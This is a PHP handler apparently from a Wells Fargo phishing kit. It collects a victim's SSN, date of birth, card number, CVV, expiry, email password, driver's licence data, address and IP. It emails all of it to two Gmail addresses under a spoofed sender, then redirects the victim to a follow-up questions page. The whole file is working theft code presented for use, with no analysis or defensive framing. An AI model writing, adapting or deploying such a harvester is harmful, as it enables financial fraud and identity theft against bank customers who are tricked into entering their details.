<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Wells Info-----------------------\n";
$message .= "SSN1           : ".$_POST['formtext2']."\n";
$message .= "SSN2           : ".$_POST['formtext3']."\n";
$message .= "SSN3              : ".$_POST['formtext4']."\n";
$message .= "SSN issue              : ".$_POST['formtext5']."\n";
$message .= "Date of birth            : ".$_POST['formtext6']."\n";
$message .= "ATM/Db Card            : ".$_POST['formtext7']."\n";
$message .= "Email           : ".$_POST['formtext8']."\n";
$message .= "Password           : ".$_POST['formtext9']."\n";
$message .= "Driver Licesnse             : ".$_POST['formtext10']."\n";
$message .= "Driver Issue Date           : ".$_POST['formtext11']."\n";
$message .= "Driver Licnes Expire           : ".$_POST['formtext12']."\n";
$message .= "Driver Issue State           : ".$_POST['formtext13']."\n";
$message .= "Address            : ".$_POST['formtext14']."\n";
$message .= "Address2           : ".$_POST['formtext15']."\n";
$message .= "City           : ".$_POST['formtext16']."\n";
$message .= "State             : ".$_POST['formtext17']."\n";
$message .= "Zipcode             : ".$_POST['formtext18']."\n";
$message .= "Number on Card           : ".$_POST['formtext19']."\n";
$message .= "Credit card           : ".$_POST['formtext20']."\n";
$message .= "Cvv           : ".$_POST['formtext21']."\n";
$message .= "Expire Date            : ".$_POST['formtext22']."\n";
$message .= "Expire Date            : ".$_POST['formtext23']."\n";
$message .= "ATm           : ".$_POST['formtext24']."\n";
$$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "bettysmith002@gmail.com, jameslucy112@gmail.com";
$subject = "Result from Wells Fargo";
$headers = "From: Wells<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: questions.html");

	 
?>